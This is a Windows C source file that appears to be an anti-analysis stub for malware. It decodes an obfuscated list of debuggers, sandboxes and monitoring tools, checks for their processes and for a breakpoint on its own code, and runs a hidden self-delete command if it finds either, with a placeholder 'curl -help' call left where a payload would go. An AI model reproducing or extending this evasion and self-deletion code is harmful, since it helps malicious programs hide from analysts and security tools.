/*
DO NOT
- build under the unicode
- use this in practice
- change curl option
*/

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <psapi.h>
#include <strsafe.h>
#pragma comment(lib, "user32.lib")
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")


const char list[][25] = {
	{~'W',~'i',~'r',~'e',~'s',~'h',~'a',~'r',~'k',~'.',~'e',~'x',~'e','\0' },
	{~'a',~'p',~'a',~'t',~'e',~'D',~'N',~'S',~'.',~'e',~'x',~'e','\0' },
	{~'A',~'u',~'t',~'o',~'r',~'u',~'n',~'s',~'.',~'e',~'x',~'e','\0'},
	{~'b',~'i',~'n',~'d',~'i',~'f',~'f',~'.',~'e',~'x',~'e','\0'},
	{~'i',~'d',~'a',~'q',~'.',~'e',~'x',~'e','\0'},
	{~'i',~'d',~'a',~'q',~'6',~'4',~'.',~'e',~'x',~'e','\0' },
	{~'P',~'r',~'o',~'c',~'m',~'o',~'n',~'.',~'e',~'x',~'e','\0' },
	{~'x',~'6',~'4',~'d',~'b',~'g',~'.',~'e',~'x',~'e','\0' },
	{~'x',~'3',~'2',~'d',~'b',~'g',~'.',~'e',~'x',~'e','\0' },
	{~'o',~'l',~'l',~'y',~'d',~'b',~'g',~'.',~'e',~'x',~'e','\0' },
	{~'I',~'m',~'m',~'u',~'n',~'i',~'t',~'y',~'D',~'e',~'b',~'u',~'g',~'g',~'e',~'r',~'.',~'e',~'x',~'e','\0' },
	{~'V',~'B',~'o',~'x',~'T',~'r',~'a',~'y',~'.',~'e',~'x',~'e','\0' },
	{~'V',~'B',~'o',~'x',~'S',~'e',~'r',~'v',~'i',~'c',~'e',~'.',~'e',~'x',~'e','\0' },
	{~'m',~'s',~'e',~'d',~'g',~'e',~'.',~'e',~'x',~'e','\0' },
	{~'c',~'h',~'r',~'o',~'m',~'e',~'.',~'e',~'x',~'e','\0' },
	{~'V',~'i',~'r',~'t',~'u',~'a',~'l',~'B',~'o',~'x',~'.',~'e',~'x',~'e','\0' },
	{~'j',~'a',~'v',~'a',~'w',~'.',~'e',~'x',~'e','\0' },
	{~'x',~'9',~'6',~'d',~'b',~'g',~'.',~'e',~'x',~'e','\0' },
	{~'i',~'d',~'a',~'w',~'.',~'e',~'x',~'e','\0' },
	{~'w',~'i',~'n',~'d',~'b',~'g',~'.',~'e',~'x',~'e','\0' },
	{~'d',~'n',~'S',~'p',~'y',~'.',~'e',~'x',~'e','\0' },
	{~'H',~'x',~'D',~'.',~'e',~'x',~'e','\0' },
	{~'S',~'c',~'y',~'l',~'l',~'a',~'_',~'x',~'6',~'4',~'.',~'e',~'x',~'e','\0' },
	{~'S',~'c',~'y',~'l',~'l',~'a',~'_',~'x',~'8',~'6',~'.',~'e',~'x',~'e','\0' },
	{~'r',~'e',~'g',~'m',~'o',~'n',~'.',~'e',~'x',~'e','\0' },
	{~'p',~'r',~'o',~'c',~'e',~'x',~'p',~'.',~'e',~'x',~'e','\0' },
	{~'p',~'r',~'o',~'c',~'e',~'x',~'p',~'6',~'4',~'.',~'e',~'x',~'e','\0' },
	{~'T',~'c',~'p',~'v',~'i',~'e',~'w',~'.',~'e',~'x',~'e','\0' },
	{~'s',~'m',~'s',~'n',~'i',~'f',~'f',~'.',~'e',~'x',~'e','\0' },
	{~'F',~'a',~'k',~'e',~'N',~'e',~'t',~'.',~'e',~'x',~'e','\0' },
	{~'n',~'e',~'t',~'m',~'o',~'n',~'.',~'e',~'x',~'e','\0' },
	{~'P',~'E',~'i',~'D',~'.',~'e',~'x',~'e','\0' },
	{~'L',~'o',~'r',~'d',~'P',~'E',~'.',~'e',~'x',~'e','\0' },
	{~'P',~'E',~'-',~'b',~'e',~'a',~'r',~'.',~'e',~'x',~'e','\0' },
	{~'P',~'P',~'E',~'E',~'.',~'e',~'x',~'e','\0' },
	{~'d',~'i',~'e',~'.',~'e',~'x',~'e','\0' },
	{~'d',~'i',~'e',~'l',~'.',~'e',~'x',~'e','\0' },
	{~'p',~'e',~'x',~'p',~'l',~'o',~'r',~'e',~'r',~'.',~'e',~'x',~'e','\0' },
	{~'d',~'e',~'p',~'e',~'n',~'d',~'s',~'.',~'e',~'x',~'e','\0' },
	{~'R',~'e',~'s',~'o',~'u',~'r',~'c',~'e',~'H',~'a',~'c',~'k',~'e',~'r',~'.',~'e',~'x',~'e','\0' },
	{~'F',~'i',~'l',~'e',~'A',~'l',~'y',~'z',~'e',~'r',~'2',~'.',~'e',~'x',~'e','\0' },
	{~'p',~'r',~'o',~'c',~'e',~'s',~'s',~'h',~'a',~'c',~'k',~'e',~'r',~'.',~'e',~'x',~'e','\0' },
	{~'R',~'e',~'g',~'s',~'h',~'o',~'t',~'-',~'x',~'6',~'4',~'-',~'U',~'n',~'i',~'c',~'o',~'d',~'e',~'.',~'e',~'x',~'e','\0' },
	//{~'F',~'i',~'r',~'e',~'f',~'o',~'x',~'.',~'e',~'x',~'e','\0' },
};

BOOL findProcess()
{
	PROCESSENTRY32  pe = { sizeof(PROCESSENTRY32) };
	HANDLE          ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	BOOL            rslt;

	for (rslt = Process32First(ss, &pe); rslt == TRUE; rslt = Process32Next(ss, &pe)) {
		int i;
		int n;
		char dec[25];
		for (i = 0; i < 45; i++) {
			n = 0;
			memset(dec, 0, sizeof(dec));
			while (list[i][n] != '\0') {
				dec[n] = ~list[i][n];
				n++;
			}
			dec[n + 1] = '\0';
			if (!_stricmp(pe.szExeFile, dec)) {
				return TRUE;
			}
		}
	}
	return FALSE;
}

void do_or_die() {
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	exit(0);
}

int main() {

	int i;
	for (i = 0; i < 5; i++) {
	    if (*((UCHAR*)findProcess + i) == 0xCC) {
		    do_or_die();
	    }
    }

	if (findProcess()) {
		do_or_die();
	}

	system("curl -help");
	do_or_die();

	return 0;
}